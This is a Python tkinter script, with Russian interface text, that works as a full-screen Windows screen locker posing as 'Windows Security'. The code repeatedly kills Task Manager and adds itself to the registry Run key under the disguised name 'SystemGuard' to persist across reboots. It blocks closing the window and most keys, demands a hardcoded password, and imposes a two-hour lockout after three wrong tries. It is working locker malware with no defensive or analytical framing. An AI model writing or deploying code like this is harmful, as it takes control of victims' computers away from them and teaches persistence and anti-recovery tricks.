import tkinter as tk
import os
import time
import threading
import winreg

attempts = 0
blocked_until = 0

def block_system():
    while True:
        os.system("taskkill /f /im taskmgr.exe 2>nul")
        time.sleep(0.5)

def add_to_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                            r"Software\Microsoft\Windows\CurrentVersion\Run", 
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemGuard", 0, winreg.REG_SZ, os.path.abspath(__file__))
        winreg.CloseKey(key)
    except: pass

threading.Thread(target=block_system, daemon=True).start()
add_to_startup()

root = tk.Tk()
root.title("Windows Security")
root.attributes("-fullscreen", True)
root.configure(bg='black')
root.protocol("WM_DELETE_WINDOW", lambda: None)

def check_password():
    global attempts, blocked_until
    
    if time.time() < blocked_until:
        remaining = int((blocked_until - time.time()) / 60)
        status_label.config(text=f"Заблокировано на {remaining} минут")
        return
        
    if entry.get() == "38180":
        root.destroy()
    else:
        attempts += 1
        if attempts >= 3:
            blocked_until = time.time() + 7200  # 2 часа
            status_label.config(text="Заблокировано на 2 часа!")
        else:
            status_label.config(text=f"Неверно! Попыток: {3-attempts}")

def block_keys(event):
    key = event.keysym
    if key not in ['0','1','2','3','4','5','6','7','8','9','BackSpace']:
        return "break"

root.bind_all('<Key>', block_keys)
root.bind('<Control-Alt-Delete>', lambda e: "break")
root.bind('<Alt-F4>', lambda e: "break")

linux_art = """
    .--.
   |o_o |
   |:_/ |
  //   \\ \\
 (|     | )
/'\\_   _/`\\
\\___)=(___/
"""

art_label = tk.Label(root, text=linux_art, fg='green', bg='black', font=('Courier', 8))
art_label.pack(pady=10)

big_label = tk.Label(root, text="WINDOWS ЗАБЛОКИРОВАН!", 
                    fg='red', bg='black', font=('Arial', 32, 'bold'))
big_label.pack(pady=20)

label = tk.Label(root, text="Введите пароль для разблокировки:", 
                 fg='white', bg='black', font=('Arial', 20))
label.pack(pady=10)

entry = tk.Entry(root, show='*', font=('Arial', 20), justify='center')
entry.pack(pady=20)
entry.focus()

button = tk.Button(root, text="ПОДТВЕРДИТЬ", 
                   command=check_password, font=('Arial', 16), width=12)
button.pack(pady=10)

status_label = tk.Label(root, text="", fg='yellow', bg='black', font=('Arial', 14))
status_label.pack(pady=10)

root.mainloop()